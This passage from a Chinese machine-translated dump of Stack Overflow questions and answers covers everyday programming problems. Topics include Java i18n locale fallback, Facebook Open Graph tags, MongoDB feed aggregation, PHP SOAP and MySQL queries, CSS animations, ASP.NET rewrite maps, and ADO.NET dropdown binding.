        try {
            decodedPath = URLDecoder.decode(path, "UTF-8");
            // This ugly thing is needed to get the correct
            // Path
            File f = new File(decodedPath);
            f = f.getParentFile().getParentFile();
            decodedPath = f.getAbsolutePath();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            this.logger.error("Failed to decode the Jar path", e);
        }
        this.logger.debug("The Path of the jar is: " + decodedPath);

        String configFolder = FilenameUtils.concat(decodedPath, "cfg");
        String i18nFolder = FilenameUtils.concat(configFolder, "i18n");
        File i18nFile = null;
        try {
            i18nFile = this.getFileForLocation(new File(i18nFolder), Locale.getDefault());
        } catch (FileNotFoundException e) {
            e.printStackTrace();
            this.logger.error("Can't find the LocaleFile", e);
        }
        if (!i18nFile.exists()) {
            // If this can't be found something is wrong
            i18nFile = new File(i18nFolder, "eng.i18n");
            if (!i18nFile.exists()) {
                this.logger.error("Can't find the i18n File at the Location: " + i18nFile.getAbsolutePath());
            }
        }

        this.logger.debug("The Path to the i18n File is: " + i18nFile);

        try {
            this.i18n = new PropertiesConfiguration(i18nFile);
        } catch (ConfigurationException e) {
            this.logger.error("Couldn't Initialize the i18nPropertiesFile", e);
        }
    }

    private File getFileForLocation(File i18nFolder, Locale locale) throws FileNotFoundException {
        Control control = Control.getControl(Control.FORMAT_DEFAULT);
        List<Locale> locales = control.getCandidateLocales(this.getBaseName(), locale);
        File f = null;
        for (Locale l : locales) {
            String i18nBundleName = control.toBundleName(this.getBaseName(), l);
            String i18nFileName = control.toResourceName(i18nBundleName, "properties");
            f = new File(i18nFolder, i18nFileName);
            this.logger.debug("Looking for the i18n File at: " + f);
            if (f.exists()) {
                return f;
            }
        }
        // Last try for a File that should exist
        if (!locale.equals(Locale.US)) {
            return this.getFileForLocation(i18nFolder, Locale.US);
        }
        throw new FileNotFoundException("Can't find any i18n Files in the Folder " + i18nFolder.getAbsolutePath());
    }

    private String getBaseName() {
        // TODO: Get this from the Settings later
        return "messages";
    }

    public static GlobalConfigurationProvider getInstance() {
        if (GlobalConfigurationProvider.instance == null) {
            GlobalConfigurationProvider.instance = new GlobalConfigurationProvider();
        }
        return GlobalConfigurationProvider.instance;
    }

    public String getI18nString(String key) {
        try {
            return this.i18n.getString(key);
        } catch (MissingResourceException e) {
            return '!' + key + '!';
        }
    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T16:58:10.543

当然，有一些方法可以做到这一点。无论如何，我相信您的问题是您尝试加载的资源的错误路径。

Nonetheless, for sure you are looking the way to use Locale fall-back mechanism to load very specific resource. It can be done. You may want to take a look at [ResourceBundle.Control](http://docs.oracle.com/javase/7/docs/api/java/util/ResourceBundle.Control.html) class. For example you can get the list of fall-back locales:

```
Control control = Control.getControl(Control.FORMAT_DEFAULT);
List<Locale> locales = control.getCandidateLocales("messages",
           Locale.forLanguageTag("zh-TW")); 
```

From there, you can actually create names of the resource files you are looking for:

```
for (Locale locale : locales) {
      String bundleName = control.toBundleName("messages", locale);
      String resourceName = control.toResourceName(bundleName, "properties");
      // break if resource under given name exist
} 
```

Then, you need to load the resource somehow - you may want to use [ClassLoader's](http://docs.oracle.com/javase/7/docs/api/java/lang/ClassLoader.html) [getResourceAsStream(String)](http://docs.oracle.com/javase/7/docs/api/java/lang/ClassLoader.html#getResourceAsStream%28java.lang.String%29) to open the `InputStream` for you. The last step could be actually use the stream as an input to [PropertyResourceBundle](http://docs.oracle.com/javase/7/docs/api/java/util/PropertyResourceBundle.html):

```
ResourceBundle bundle = new PropertyResourceBundle(inputStream); 
```

You can alternatively pass a [Reader](http://docs.oracle.com/javase/7/docs/api/java/io/Reader.html) rather than `InputStream`, which has at least one advantage - you may actually allow properties file to be encoded in UTF-8, rather than regular ISO8859-1.

# facebook - 需要帮助 - FB Like 按钮不会发布到墙上

> ID：13418861
> 
> 赞同：1
> 
> 时间：2012-11-16T14:45:44.867
> 
> 标签：facebook, facebook-like

您好社区成员，

我找不到有用的答案，所以我会试一试：我最近开发了一个网站，实现了一个 FB“推荐”（与“喜欢”相同）按钮。我以前从未处理过这个问题，因此我完全缺乏知识。

现在，我实现了 FB 开发人员的 Like 页面 (--> [http://developers.facebook.com/docs/reference/plugins/like/](http://developers.facebook.com/docs/reference/plugins/like/) ) 在网站中正确创建的代码（脚本和 DIV 标签，然而似乎缺少一些不是自动生成的东西，需要添加按钮才能正常工作。**它目前没有发布到 FB 墙上。**

在进行调试检查后，我收到以下结果：[...]

不幸的是，我不知道如何处理这些数据。**我如何**以及**在**HTML 代码中的确切位置实现那些缺少的 TAGS 和 PROPERTIES？任何帮助将不胜感激...

亲切的问候和非常感谢，:-)

文档

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T21:06:21.393

您似乎缺少 Open Graph`meta`标记。那些进入`head`你的页面。

Facebook 有一个[生成器](https://developers.facebook.com/docs/reference/plugins/like/#oggenerator)来帮助您创建标签，但您需要将它们添加到您的标记中。

# mongodb - 按需聚合活动历史记录

> ID：13418862
> 
> 赞同：0
> 
> 时间：2012-11-16T14:45:50.757
> 
> 标签：mongodb, database-design, redis

根据他/她关注的人，有哪些技术可以呈现为特定用户量身定制的活动提要？这里有些例子：

*   用户 B 赞了用户 A 的照片
*   用户 B 和用户 C 对用户 A 的图片进行了推荐*（根据用户关注的人进行聚合）*
*   用户 B 赞了 10 张照片：[照片 1、照片 2 等]

Instagram 等服务提供带有针对特定用户量身定制的活动聚合的提要。我假设为服务器上的每个用户保存单独的提要不会扩展。所以聚合需要按需完成，但必须快速。

是否有用于 mongodb 或 redis 的开源工具来解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-20T18:18:53.087

可以采取多种方法。

在 MongoDB 中，一种常见的模式是对某些类型的信息进行预聚合——也就是说，当事件发生时更新某些字段或文档，以便在查询时快速读取最终信息。

另一种选择是使用查询 - 常规和聚合框架来“实时”获取数据。

第三种选择可能是定期运行 MapReduce 作业以计算各种聚合，然后将它们保存以供快速访问。这牺牲了访问速度以换取最终的一致性——因为您不会看到实时更新的信息。

# php - 使用 PHP 使用 SOAP complexType webservice

> ID：13418865
> 
> 赞同：1
> 
> 时间：2012-11-16T14:45:57.190
> 
> 标签：php, web-services, soap, complextype

好吧，伙计们，有件事困扰了我好几天。我有一些需要在 PHP 中使用的*复杂类型的 WebService。*

Web 服务看起来像这样：

```
<s:element name="VerifySession">
<s:complexType>
<s:sequence>
<s:element minOccurs="0" maxOccurs="1" name="request" type="tns:VerificationRequest"/>
</s:sequence>
</s:complexType>
</s:element>
<s:complexType name="VerificationRequest">
<s:sequence>
<s:element minOccurs="0" maxOccurs="1" name="SessionKey" type="s:string"/>
<s:element minOccurs="1" maxOccurs="1" name="ApplicationID" type="s1:guid"/>
</s:sequence>
</s:complexType> 
```

我试图用不同的方法解决这个问题，目前我的代码看起来像这样

```
try {
  $info = $soapClient->__call("SignIn", array($ap_param));
  $search_query = new StdClass();
  $search_query->oVerificationRequest = new StdClass();
  $search_query->oVerificationRequest->SessionKey = $token;
  $search_query->oVerificationRequest->ApplicationID = "00000000-0000-0000-0000-000000000000";

  $info = $soapClient -> VerifySession($search_query);
} catch (SoapFault $fault) {  
      echo "ERROR" .$fault;
} 
```

`$token`值是已知的，所以那里没有问题。

# asp.net - ASP.NET Url 重写映射

> ID：13418868
> 
> 赞同：1
> 
> 时间：2012-11-16T14:46:19.607
> 
> 标签：asp.net, url-rewriting, configuration-files

我正试图了解 ASP.NET 中的 url 重写。我有两个 rewritemaps.config 文件（rewritemaps1.config 和 rewritemaps2.config）我不得不将它们分成两部分，因为配置文件的大小对于 IIS 来说太大而无法处理。

现在，在 web.config 中，我需要为重写器包含这两个映射，但我只能`<rewritemaps>`在配置中包含一个。

我的 web.config 看起来像这样：

```
<rewrite>                
    <rewriteMaps configSource="rewritemaps1.config"></rewriteMaps>

    <rules>
      <rule name="Redirect rule1 for Redirects">
        <match url=".*" />
        <conditions>
          <add input="{Redirects:{HTTP_HOST}{REQUEST_URI}}" pattern="(.+)" />
        </conditions>
        <action type="Redirect" url="http://{C:1}" appendQueryString="false" redirectType="Permanent"/>
      </rule>

    </rules>
  </rewrite> 
```

有没有办法“包含”这两个配置？:-)

提前致谢。

# html - 为什么@-webkit-keyframes 动画不起作用？

> ID：13418869
> 
> 赞同：0
> 
> 时间：2012-11-16T14:46:19.260
> 
> 标签：html, css, css-animations

我的问题是@-webkit-keyframes 动画不起作用，我没有看到任何线索......所有其他部分都运行良好，包括背景颜色和字体颜色过渡。这是HTML和CSS：

```
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>test</title>
<link rel="stylesheet" href="test.css" />
</head>
<body id="body">

<nav>
    <ul id="nav">
        <li><a href="#" class="link"><div class="content"><span class="span">About</span></div></a></li>
        <li><a href="#" class="link"><div class="content"><span class="span">Skills</span></div></a></li>
        <li><a href="#" class="link"><div class="content"><span class="span">Works</span></div></a></li>
        <li><a href="#" class="link"><div class="content"><span class="span">Contact</span></div></a></li>
    </ul>
</nav><br />

<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="test.js"></script>
<script type="text/javascript" src="jquery_ui.js"></script>
</body>

</html> 
```

CSS：

```
#nav{
    list-style:none;
    margin:40px auto;
    padding:0;
    width: 820px;
}
#nav li{
    width: 200px;
    height: 300px;
    overflow: hidden;
    position: relative;
    float: left;
    background: #00D8CC;
    -webkit-box-shadow: 1px 1px 2px rgba(0,0,0,0.2);
    margin-right: 2px;
    -webkit-transition: all 300ms linear;
}

#nav li:last-child {
    margin-right: 0px;
}

#nav li a{
    display:block;
    text-align: center;
    position: relative;
    height: 100%;
    color: #333;
}

.content {
    position: absolute;
    left: 0px;
    width: 100%;
    height: 50%;
    top: 50%;
}

.span {
    font-size: 30px;
    opacity: 0.8;
    text-align: center;
    line-height: 40px;
    -webkit-transition: all 300ms linear;
}

#nav li:hover {
    background-color: #00AAAA;

}

#nav li:hover .span{
    color: green;
    -webkit-animation: move 300ms ease;
}

@-webkit-keyframes move { 
    from {
            -webkit-transform: translateX(-100%) rotate(-90deg);
    }
    to {
            -webkit-transform: translateX(0%) rotate(0deg);
    }
} 
```

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T17:08:07.547

It's a display issue with the `<span>`. If you set it to `display: block;` it should work. See [http://jsfiddle.net/ryanbrill/mdb7X/](http://jsfiddle.net/ryanbrill/mdb7X/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-21T20:13:49.750

几个快速点，

1 - nav 和 span 都是不是 id 或类的元素

2 - 你没有@keyframes 移动，或者转换所有属性来激活它加上你的时间以毫秒为单位将导致一些新的浏览器挂起，因为它们似乎都期望0.3s的十进制值。

2 - 此外，此级别的动画和一些过渡只能应用于包含您想要动画的项目的包含元素，即 div、导航、页眉、部分、文章、页脚等。一种解决方案是使用 display: inline-blocks; 对齐方法并将各个部分放置在单独的容器中，这将要求第一个子元素具有 suedo 元素 ::before （以及第二个 :before 以支持一些较旧的浏览器）并且主容器具有 suedo 元素 :: after (;after) 强制正确对齐的理由。在“Codr0ps”网站上有几个关于如何实现这一目标的优质示例 - [http://tympanus.net/codrops/](http://tympanus.net/codrops/)

# php - PHP mysql 选择连接

> ID：13418874
> 
> 赞同：0
> 
> 时间：2012-11-16T14:46:29.123
> 
> 标签：php, mysql, concat

我有这个功能，它以一种形式显示自动建议：

```
function searchbyId($params) {

    $input = strtolower($params['input']);
    $len = strlen($input);
    $limit = isset($params['limit']) ? (int) $params['limit']:25;
    $items=array();
    $sql='SELECT DISTINCT nIdentidad, CONCAT(primerNombre, ' ', segundoNombre, ' ', primerApellido, ' ', segundoApellido) AS nombre FROM tarjeta_indent WHERE nIdentidad LIKE \''.$input.'%\' ORDER BY nIdentidad LIMIT '.$limit;
    $resp=db_query($sql);
    if($resp && db_num_rows($resp)){
        while(list($nIdentidad)=db_fetch_row($resp)) {
            //$name=(strpos($name,'@')===false)?$name:'';
            $items[] ='{"id": "'.$nIdentidad.'", "value": "'.$nIdentidad.'"}';

        }
    }
    $result= '{"results": ['.implode(", ", $items).']}';
    return $result;
} 
```

但仅当我将查询更改为此时才有效：

```
$sql='SELECT DISTINCT nIdentidad FROM tarjeta_indent WHERE nIdentidad LIKE \''.$input.'%\' ORDER BY nIdentidad LIMIT '.$limit; 
```

我该如何做连接部分？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T15:16:47.863

我觉得这非常简单，但是您的 concat 语句中有语法错误；您使用单引号来转义字符串，但 PHP 字符串是用单引号定义的：

```
$sql='SELECT DISTINCT nIdentidad, CONCAT(primerNombre, ' ', segundoNombre, ' ', primerApellido, ' ', segundoApellido) AS nombre FROM tarjeta_indent WHERE nIdentidad LIKE \''.$input.'%\' ORDER BY nIdentidad LIMIT '.$limit; 
```

这个怎么样？

```
$sql = sprintf(<<<SQL
    SELECT
      DISTINCT nIdentidad,
      CONCAT(primerNombre, ' ', segundoNombre, ' ', primerApellido, ' ', segundoApellido) AS nombre
    FROM tarjeta_indent
    WHERE nIdentidad LIKE '%s'
    ORDER BY nIdentidaa
    LIMIT %d
SQL
  , mysql_real_escape_string($input), $limit); 
```

如果我是对的`db_query`并且您正在使用 Drupal，请尝试使用此方法（对于 Drupal 7）：

```
$sql = <<<SQL
    SELECT
      DISTINCT nIdentidad,
      CONCAT(primerNombre, ' ', segundoNombre, ' ', primerApellido, ' ', segundoApellido) AS nombre
    FROM tarjeta_indent
    WHERE nIdentidad LIKE :input
    ORDER BY nIdentidaa
    LIMIT :limit
SQL;
$resp = db_query($sql, array(':input' => $input, ':limit' => $limit)); 
```

这将是 Drupal 6 版本：

```
$sql = <<<SQL
    SELECT
      DISTINCT nIdentidad,
      CONCAT(primerNombre, ' ', segundoNombre, ' ', primerApellido, ' ', segundoApellido) AS nombre
    FROM tarjeta_indent
    WHERE nIdentidad LIKE %s
    ORDER BY nIdentidaa
    LIMIT %d
SQL;
$resp = db_query($sql, $input, $limit); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:53:29.223

CONCAT 将适用于字符串/varchar，但不适用于数字。因此，如果primerNombre 和segundNombre 是INT 数据类型，则CONCAT 将失败。尝试使用 CONVERT 函数：

```
SELECT DISTINCT nIdentidad, 
       CONCAT( CONVERT(primerNombre, char(8)), ' ', 
               CONVERT(segundoNombre, char(8))  ) as nombre 
```

# ms-access - 如何检测安装了哪个 MS-Access 2010 运行时？

> ID：13418876
> 
> 赞同：2
> 
> 时间：2012-11-16T14:46:34.300
> 
> 标签：ms-access

microsoft 提供了两个[访问运行时。](https://www.microsoft.com/en-us/download/details.aspx?id=10910)x86 和 x64 版本 - 不幸的是 x64 运行时版本无法打开 32 位 mde 文件，反之亦然。

检测安装了哪个运行时的最简单方法是什么？

我最喜欢的方式是询问注册表。

[此处](https://stackoverflow.com/questions/2203980/detect-whether-office-2010-is-32bit-or-64bit-via-the-registry)描述的方式不起作用，因为 access-runtime 不会创建 Outlook 注册表项。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-20T13:58:24.933

我以这种方式解决了我的问题：

从注册表 HKLM\SOFTWARE\Classes\Access.Application.14\shell\Open\Command 从默认键中，我得到了 msaccess.exe（2010 版）的路径。

[然后我用ImageLoad](http://msdn.microsoft.com/en-us/library/ms680209%28VS.85%29.aspx)函数打开那个文件。在返回结构中，我阅读了机器字段。

[加载图像](http://msdn.microsoft.com/en-us/library/ms680349%28v=vs.85%29.aspx)。[文件头](http://msdn.microsoft.com/en-us/library/ms680336%28v=vs.85%29.aspx)。文件头[.Machine](http://msdn.microsoft.com/en-us/library/ms680313%28v=vs.85%29.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T15:40:07.317

我找到[了这个链接](http://community.installshield.com/showthread.php?t=201524)，但我不知道它是否是失败证明。此注册表项在安装 64 位 Access 时存在。

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\14.0\Access Connectivity Engine\InstallRoot 
```

# css - float div 100% 容器高度，全是动态的

> ID：13418877
> 
> 赞同：2
> 
> 时间：2012-11-16T14:46:34.943
> 
> 标签：css, html

我一直在环顾四周，找不到任何解决此问题的方法。

我有一个容器 div，在这个里面，我有几个浮动 div，它们的内容是动态生成的，可以从几个词到几乎一页不等。这基本上创建了一行表格（由于某些原因我不想使用表格布局）。

我成功地使容器扩展到更大的内容使用`overflow:hidden;`

现在我希望我所有的 div 都适应容器的高度。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:58:44.357

您可以为容器内的所有 div 设置一个类...假设`class="contained"`

然后您可以添加一个 js 函数以在生成文档时运行，该函数找到所有包含的 div 的最大高度并为所有其他 div 设置相同的高度。

```
 $(function() {
      var maxheight=0;
      $(".contained").each( function ()  {
          if (maxheight<$(this).height()
          maxheight=$(this).height();
      });
      $(".contained").each( function ()  {
      $(this).height(maxheight);
      }); 
} 
```

# java - 保护服务器到服务器 http post

> ID：13418879
> 
> 赞同：0
> 
> 时间：2012-11-16T14:46:39.560
> 
> 标签：java, http, web, webserver, firewall

网站是基于JSF、Servlet开发的。在我的网站中，我接受来自少数使用 HTTP POST 方法的受限网站的数据提交。我们交换一些安全密钥以确保正确的来源正在发送数据。

但是有什么方法可以确保数据只从特定的域/IP地址提交？在应用程序级别我可以检查

> request.header('Referer')

，但某些代理可能会隐藏引用者。此配置可以在防火墙级别完成吗？

例如。假设我的网站是一个支付网关网站，与 www.abc.com 集成。我只希望 abc.com 提交数据。因此，使用 abc.com 的用户应该只能通过 abc.com 向我的网站提交数据，而不能通过任何其他网站提交数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:57:04.760

如果您使用的是 apache 服务器，则可以使用

```
Order Deny,Allow
Deny from all
Allow from xxx.xxx.xxx.xxx 
```

这个。因此，您可以指定哪些所有域都可以访问您的应用程序

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:49:47.913

您可以使用[ServletRequest.getRemoteAddr()](http://docs.oracle.com/javaee/6/api/javax/servlet/ServletRequest.html#getRemoteAddr%28%29)方法来验证客户端或最后一个代理。

# java - 摆脱多余的while语句

> ID：13418880
> 
> 赞同：0
> 
> 时间：2012-11-16T14:46:54.300
> 
> 标签：java, while-loop

任何人都可以看看这段代码并告诉我是否有办法将两个 while 语句合并为一个？

```
public static void main(String[] args) throws IOException
{
    BufferedReader fileInput;
    fileInput = new BufferedReader(new FileReader("information.txt"));
    int countOfClients = 0;
    while (fileInput.ready())
    {
        fileInput.readLine();
        countOfClients ++;
    }
    int totalClients = countOfClients ;

    Client[] clientDetails = new Client[totalClients];
    int clientNumber = 0;

    while (fileInput.ready())
    {
        String currentLineOfText = fileInput.readLine();
        String clientName = currentLineOfText.substring(0, 19);
        String gender = currentLineOfText.substring(20,21);
        char clientGender = gender.charAt(0);
        int clientAge = Integer.parseInt(currentLineOfText.substring(22,24));
        String clientInterests = currentLineOfText.substring(25);
        clientDetails[clientNumber] = new Client(clientName, clientGender, clientAge, clientInterests);
        clientNumber++;
    } 
```

第一个 while 语句读取文本中的所有行，因此它知道它需要对象数组中有多少元素。
然后创建类 Client[] 的数组 clientDetails。
第二个 while 语句填充该数组。
我可以避免使用两个 while 语句吗？

注意：这是一个分配，我必须使用数组。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:52:25.517

正如他们所说，使用 ArrayList 来存储项目。

如果内存是一个问题，您可以使用 ArrayList.toArray() 将其修剪到最基本的内容。

如果效率是一个问题，您可能不应该首先从文件中读取。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:48:23.737

为什么要创建数组？为什么不使用一个`while`循环来创建一个`ArrayList`然后（如果您*需要*一个数组）使用[ArrayList.toArray()](http://docs.oracle.com/javase/6/docs/api/java/util/ArrayList.html#toArray%28T%5B%5D%29)从中提取结果数组？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T14:48:25.200

您可以使用[ArrayList](http://docs.oracle.com/javase/7/docs/api/java/util/ArrayList.html)而不是数组，只需使用：

```
list.add(new Client(...)); 
```

如果你真的需要一个数组，你可以随时调用：

```
Client[] array = list.toArray(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-16T14:48:30.937

`Client[]`您可以通过更改为 ArrayList();来避免两个 while 循环。

例子：

```
List<Client> clientDetails = new ArrayList<Client>();
    int clientNumber = 0;

    while (fileInput.ready())
    {
        String currentLineOfText = fileInput.readLine();
        String clientName = currentLineOfText.substring(0, 19);
        String gender = currentLineOfText.substring(20,21);
        char clientGender = gender.charAt(0);
        int clientAge = Integer.parseInt(currentLineOfText.substring(22,24));
        String clientInterests = currentLineOfText.substring(25);
        clientDetails.add( new Client(clientName, clientGender, clientAge, clientInterests));
    } 
```

注意：手工编辑，可能存在语法错误。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-16T15:02:59.567

如果你真的不能使用预先编写的 ArrayList 类，你总是可以自己有效地重新实现它（或者至少是它的相关部分）。

关键技术是猜测您可能需要的数组大小，定义一个该大小的数组，如果您发现它太小，则创建一个更大的数组并将所有现有值从旧数组复制到新数组数组，然后在剩余的空间中继续。

在循环的另一端，您可能需要再进行一步，并再次缩小数组（通过声明一个较小的数组并复制值），这样您就没有剩余空间了。

或者，正如所有其他答案所建议的那样，只需使用一个 ArrayList，它已经为您完成了这个......

# windows-phone-7 - 对波形文件进行下采样

> ID：13418882
> 
> 赞同：0
> 
> 时间：2012-11-16T14:47:09.133
> 
> 标签：windows-phone-7, microphone, audio-processing, downsampling

我需要将 16000 赫兹 PCM 16 位波形文件下采样到 8000 赫兹。我对音频处理知之甚少（几乎没有），我只了解所有程序员都了解的位、字节、移位等。

它是一个 Windows Phone 应用程序。

你有什么建议？此外，据我了解，XNA 框架中 Microphone 类的 SampleRate 是不可定制的，因此它只能为您提供 16000 赫兹的数据。有没有办法在 Windows Phone 中获取 8000 赫兹的原始音频数据？那将是一个更容易的解决方案:)

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T21:20:34.303

如果您找不到好的解决方案并且必须继续进行自己的转换，以下可能会对您有所帮助。

假设您使用 XNA 框架麦克风+wav，如下所示： [http ://damianblog.com/2011/02/07/storing-wp7-recorded-audio-as-wav-format-streams/](http://damianblog.com/2011/02/07/storing-wp7-recorded-audio-as-wav-format-streams/)

然后，要获得 8khz 而不是 16khz，您只需从mic.BufferReady 事件中返回的数据中删除每秒的值。或者最好使用插值（而不是每秒删除一个值，您可以保存两个值的平均值）

for (int i=0; i < arr.length/2;i++) res[i] = (arr[2*i]+arr[2*i+1]))

也不要忘记在 WriteWavHeader 函数中为 sampleRate (8000) 设置正确的值

# .net - 将方程中的数据存储到数组中

> ID：13418885
> 
> 赞同：1
> 
> 时间：2012-11-16T14:47:29.960
> 
> 标签：.net, vb.net, cad

我正在尝试使用 Visual Basic 2003 使用 Solid Edge 自动化 3D CAD 程序。

在那里，我想用 4 度方程制作曲线。

我从 Solid Edge SDK 获得了以下表格

> ```
> objBSplinecurves.AddByPoints(Order:=x, ArraySize:=x, Array:=x) 
> ```

我的问题：是否可以循环方程，例如，从 x*0.2 到 x*1.5（当 'x' 是像 9 这样的常数时）

然后将这些点存储到一个数组中？我被困在存储它们。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T15:17:18.363

的目的`X`是可变的。所以你应该说`9*x`, where `x=0.2:0.1:1.5`（在 Matlab 语法中）。无论如何，这可能会帮助您入门：

```
Dim listOfMultipliers As New List(Of Double)
For i = 0.2 To 1.5 Step 0.1
  listOfMultipliers.Add(i)
Next
Dim multipliersArray() As Double = listOfMultipliers.ToArray() 
```

# php - 在javascript中显示对象

> ID：13418887
> 
> 赞同：1
> 
> 时间：2012-11-16T14:47:36.203
> 
> 标签：php, jquery, ajax, json

我编写了一个脚本来进行 ajax 调用这是我的代码

```
function ajax_post(obj) {
    obj = '#'+ obj; 

    var formData = $(obj).serializeArray();    

    $.ajax({
        url: '__core/info.php',
        type:'get',
        dataType: 'json',
        data: formData,
        success: function(resp){
            alert(resp);
        }
    })
} 
```

这是我的 info.php

```
$last_Res = theme::get_last_themes_desk(); //$last_Res is an array 
echo(json_encode($last_Res)); 
```

但是当警报它显示返回对象对象时......如果数据类型是 json 我应该怎么办我应该将它转换为另一种格式？$last_Res 是一个数组

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T14:52:53.350

回应您的评论（显示响应数据，这是一个数组，包含一个对象）：

```
//resp = [{"id":"2","name":"babak_theme","sh_describ":"support css3 and ie 9 ","rate":"3","time":"2"}];
resp = resp[0];
alert('id => ' + resp.id + ', Name => ' + resp.name);//etc... 
```

会很好地为您服务...

`$last_Res`很可能是一个*关联数组*。JS 没有关联数组，但将它们转换为对象/对象字面量：

```
//php:
$foo = array('foo' => 'bar');
//in JS:
var foo = {foo: 'bar'};
alert(foo);//alerts [object Object]
console.log(foo);//shows you what properties/prototypes/methods the object has 
```

仅此而已。要访问数据：

```
for (var prop in resp)
{//for "assoc arrays"
    if (resp.hasOwnProperty(prop))
    {
        alert(prop + ' => '+resp[prop]);
    }
}
for (var i=0;i<resp.length;i++)
{//for regular arrays
    alert(i + ' => ' + resp[i])'
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:52:26.033

在您的 info.php 中，您应该将`Content-Type`标题设置`application/json`为指示您要返回的内容：

```
header('Content-Type: application/json'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T14:51:18.813

你还没有发布 json 格式。通常你可以访问相应的。像这样的值：

如果json格式为：

```
data['index']['subindex1'] = 'value1'
data['index']['subindex2'] = 'value2' 
```

你可以

```
alert(resp.index.subindex1); 
```

# php - Monolog 未在 symfony2 下的生产设置上启动

> ID：13418892
> 
> 赞同：1
> 
> 时间：2012-11-16T14:48:06.590
> 
> 标签：php, symfony, monolog

当运行具有生产设置和调试禁用的应用程序时，独白不会启动。启用调试后，它会照常启动。使用开发设置，无论调试选项如何，它都会启动。

如何在禁用调试的情况下强制在生产设置上运行独白？

开发和生产配置是相同的：

```
monolog:
    handlers:

    main:
        type:   stream
        path:   %kernel.logs_dir%/%kernel.environment%.log
        level:  debug
    firephp:
        type:   firephp
        level:  info
    custom:
        type:   service
        id:     monitoring.errbit
        level:  critical 
```

在开发设置独白运行完美，在生产它甚至没有启动。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-30T11:05:47.373

默认的 Symfony2 配置包含 config_prod 和 config_dev 的不同处理程序。如果你把它放在 config.yml 中，你应该确保你删除了 config_prod.yml 中的独白配置块，否则它将覆盖 config.yml 中的那个。

除此之外，就 monolog 而言，prod 和 dev 之间确实没有区别，除非您将内核中的捆绑包更改为仅在 dev/test 中启用，但这不是默认设置。

# c# - 填充下拉列表

> ID：13418898
> 
> 赞同：0
> 
> 时间：2012-11-16T14:48:27.153
> 
> 标签：c#, asp.net, ado.net

我有以下代码来填充下拉列表：

```
string strConn = ConfigurationManager.ConnectionStrings["PhoQL"].ConnectionString;
using (SqlConnection con = new SqlConnection(strConn))
{
  DataSet ds = new DataSet();
  using (SqlDataAdapter myda = new SqlDataAdapter("SELECT [Abrv], [State] FROM [States]", con))
  {
    myda.Fill(ds)
    ddlShipState.DataSource = ds;
  }
}
ddlShipState.DataTextField = "State";
ddlShipState.DataValueField = "Abrv";
ddlShipState.DataBind(); 
```

我想知道是否有更有效的方法来做到这一点。请注意，我不必打开和关闭连接。想知道它是否对我的例子有影响。就更高效而言，我正在为上述内容寻找最佳代码实践。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T15:06:12.680

> 请注意，我不必打开和关闭连接。

不，但`DataAdapter`它是隐含的。

[MSDN](http://msdn.microsoft.com/en-us/library/zxkb3c3d.aspx)：

> 如果在调用 Fill 之前关闭了 IDbConnection，则打开它以检索数据，然后关闭它。如果在调用 Fill 之前连接已打开，则它保持打开状态。

但还要注意，在使用时打开和关闭并不是低效的[`Connection-Pooling`](http://msdn.microsoft.com/en-us/library/8xx3tyca.aspx)（默认）。因为 then`con.Open`只是意味着“等等，我现在需要这个连接”并且`con.Close`意味着“好的，你现在可以在其他地方重用它，我已经完成了”。

因此，您应该始终在完成连接后立即关闭它。否则，连接池每次都需要打开新的物理连接，这可能会导致异常（最大默认连接数为 100），但总是会降低性能。

处置/关闭连接（任何`IDisposable`）的最佳方法是使用以下[`using`语句](http://msdn.microsoft.com/en-us/library/yh598w02.aspx)：

```
using(var con = new SqlConnection(ConfigurationManager.ConnectionStrings["PhoQL"].ConnectionString))
using(var cmd = new SqlCommand("SELECT [Abrv], [State] FROM [States]", con))
using(var da = new SqlDataAdapter(cmd))
{
    DataTable tbl = new DataTable();
    da.Fill(tbl);
    ddlShipState.DataSource = tbl;
    ddlShipState.DataTextField = "State";
    ddlShipState.DataValueField = "Abrv";
    ddlShipState.DataBind();
} 
```

（旁注：我`DataSet`用“打火机”代替了你的`DataTable`）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T15:06:45.843

如果你一遍又一遍地这样做，你应该考虑缓存数据：

[http://msdn.microsoft.com/en-us/library/aa478965.aspx](http://msdn.microsoft.com/en-us/library/aa478965.aspx)

这样，您只需访问数据库一次……即使有 10,000 个用户。

# wpf - XAML 样式，在 DataTrigger 上设置行为属性

> ID：13418904
> 
> 赞同：1
> 
> 时间：2012-11-16T14:48:35.543
> 
> 标签：wpf, styles

所以，我是 WPF 的新手，所以这可能是微不足道的，但我无法弄清楚。

我有一个文本框。

```
